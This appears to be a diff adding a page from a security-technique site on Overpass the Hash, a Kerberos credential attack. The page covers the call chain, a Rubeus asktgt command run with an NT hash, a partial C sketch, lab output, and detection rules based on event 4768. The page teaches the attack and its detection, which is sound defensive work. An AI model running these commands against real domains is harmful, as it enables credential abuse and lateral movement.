@@ -1,0 +1,166 @@
+---
+title: Overpass the Hash
+mitre: T1550.002
+category: credential-access
+group: Kerberos Attacks
+summary: Turn an NT hash into a Kerberos TGT via the AS-REQ pre-auth, then move laterally without the password.
+platform: [Windows]
+tags: ['Kerberos', 'NTLM', 'Rubeus']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: Obtain the account's NT hash
+    desc: From an LSASS dump, a hash dump, or a prior Pass the Hash.
+    dll: '-'
+  - call: Build the AS-REQ with encrypted pre-auth
+    desc: Encrypt the Kerberos timestamp with the NT hash (RC4) and send it to the KDC.
+    dll: krb5
+  - call: KDC validates and issues a TGT
+    desc: The KDC decrypts the pre-auth with the stored hash; on match it returns a signed TGT.
+    dll: krb5
+  - call: Use the TGT
+    desc: Request service tickets and move laterally with normal Kerberos.
+    dll: krb5
+detections:
+  - src: EVENT 4768
+    text: An AS-REQ (4768) with RC4 pre-auth (0x12) for an account from a host with no interactive logon.
+  - src: EVENT 4768
+    text: A 4768 with RC4-HMAC pre-auth in an AES-enforced domain - weak pre-auth implies an NT hash.
+  - src: BEHAVIOURAL
+    text: A hash-derived TGT followed by a burst of TGS requests - overpass into a full foothold.
+  - src: NETWORK
+    text: An AS-REQ carrying RC4 pre-auth etype for an account whose last interactive logon is stale.
+related:
+  - mitre: T1550.002
+    title: Pass the Hash
+    desc: The NTLM-side equivalent over SMB; overpass goes through Kerberos to earn a real TGT.
+    href: /techniques/credential-access/pass-the-hash
+  - mitre: T1550.003
+    title: Pass the Ticket
+    desc: Once overpass earns the TGT, pass-the-ticket replays it to a target host.
+    href: /techniques/credential-access/pass-the-ticket
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: The usual source of the NT hash the technique consumes.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: With a legitimate TGT in hand, kerberoasting becomes available next.
+    href: /techniques/credential-access/kerberoasting
+labKit:
+  - label: Rubeus overpass lab script
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+  - label: Detonation VM profile
+    href: /toolkit
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Overpass the Hash turns an NT hash into a genuine Kerberos ticket without ever knowing the
+plaintext password. The Kerberos AS-REQ step requires the client to prove it knows the
+account's secret by encrypting a timestamp with that secret. The secret is normally the
+password, but the KDC will also accept the NT hash as the pre-authentication key. Feed it the
+NT hash and the KDC issues a real, signed TGT - indistinguishable from one earned with the
+password.
+
+This is the Kerberos twin of [Pass the Hash](/techniques/credential-access/pass-the-hash).
+Classic PtH authenticates directly over SMB with the NTLM hash and stops there. Overpass goes
+through the KDC, so it produces a TGT that can then request any service ticket - opening the
+door to [kerberoasting](/techniques/credential-access/kerberoasting) and lateral movement that
+pure NTLM PtH cannot reach. The cost is that the AS-REQ is now visible to the domain
+controller, which is exactly where detection lives.
+
+<Callout type="note">
+  The TGT overpass earns is legitimate, so downstream activity looks normal. The anomaly is the
+  *origin*: a TGT requested with RC4 pre-auth from a host where the account never logged in
+  interactively. That single 4768 is the whole story for most defenders.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+[Rubeus](https://github.com/GhostPack/Rubeus) performs the overpass with `asktgt`, the `/rc4:`
+flag telling it to use the NT hash for the pre-auth instead of a password.
+
+<CodeBlock
+  file="overpass.ps1"
+  label="PowerShell"
+  lang="powershell"
+  code={`# the hash is the target account's NT hash (16-byte hex)
+rubeus.exe asktgt /user:svc-app /rc4:8846f7eaee8fb117ad06bdd830b7586c \\
+  /domain:corp.local /gettickets /renewals
+
+# a real TGT is now in the cache; request service tickets as normal
+klist.exe /get`}
+/>
+
+### C-level sketch
+
+Overpass is a normal AS-REQ whose pre-authentication timestamp is encrypted with the NT hash
+rather than the password.
+
+<CodeBlock
+  file="overpass.c"
+  label="C"
+  lang="c"
+  code={`// 1. take the account NT hash
+uint8_t ntlm[16];  // ... from an LSASS dump ...
+
+// 2. encrypt the current timestamp with RC4-HMAC using the NT hash  <-- the
+//    step the KDC decrypts with the stored hash; a match issues a real TGT
+krb5_keyblock key;
+key.enctype = ENCTYPE_RC4_HMAC;
+memcpy(key.keydata, ntlm, 16);
+krb5_enctype etype = ENCTYPE_RC4_HMAC;
+krb5_encrypt(&ctx, &key, etype, &timestamp_blob, &preauth);
+
+// 3. send the AS-REQ with that preauth; on success the KDC returns a
+//    signed TGT the attacker can now use for any service ticket.
+//    <-- the AS-REQ send + TGT handling is omitted`}
+/>
+
+## Verifying in the lab
+
+After the overpass, `klist /get` shows a TGT for the account, and a follow-up `klist /get:
+krbtgt` or a service-ticket request succeeds. On the domain controller the 4768 shows the
+RC4 pre-auth etype.
+
+<CodeBlock
+  file="klist"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`> klist /get
+Current user: CORP\\svc-app
+
+    Start Time          End Time            Service Name
+    ------------        --------            ----------
+    09/04/2026 14:21    09/05/2026 14:21    krbtgt/CORP
+        ^ TGT obtained from an NT hash, no password logon  <-- the artifact`}
+/>
+
+## Detection
+
+The whole technique is one event on the domain controller: an AS-REQ that used an NT hash as
+its pre-authentication key.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the 4768 RC4-pre-auth check is the cheapest, highest-fidelity control and should be
+a standing rule on every DC. The behavioural TGT-then-TGS-burst rule adds context but needs a
+correlation window. The network check only helps where KDC traffic is also inspected.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
